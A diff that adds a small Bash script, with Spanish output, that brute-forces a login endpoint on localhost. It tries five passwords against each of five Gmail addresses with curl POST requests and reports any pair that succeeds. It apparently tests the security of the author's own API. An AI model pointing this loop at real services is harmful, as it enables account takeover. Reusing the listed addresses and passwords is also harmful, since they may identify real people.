@@ -1,0 +1,27 @@
+#!/bin/bash
+
+API="http://localhost:8000"
+echo "=== Probando seguridad del login ==="
+passwords=(
+    "ABC2024" "Pass09" "AjIplj0" "Abyss98" "bohemian"
+)
+emails=("camilasolvil@gmail.com" "matias090@gmail.com" "valelemus@gmail.com" "milevilla@gmail.com" "angiefelton@gmail.com")
+
+echo "Probando ${#emails[@]} usuarios con ${#passwords[@]} contraseñas..."
+echo ""
+for email in "${emails[@]}"; do
+    echo "Atacando: $email"
+    for pass in "${passwords[@]}"; do
+        respuesta=$(curl -s -X POST "$API/login" \
+            -H "Content-Type: application/json" \
+            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
+        if echo "$respuesta" | grep -q "exitoso"; then
+            echo " ENCONTRADO: $email - $pass"
+        else
+            echo " Fallo: $pass"
+        fi
+    done
+    echo "---"
+done
+
+echo "=== Prueba terminada ==="
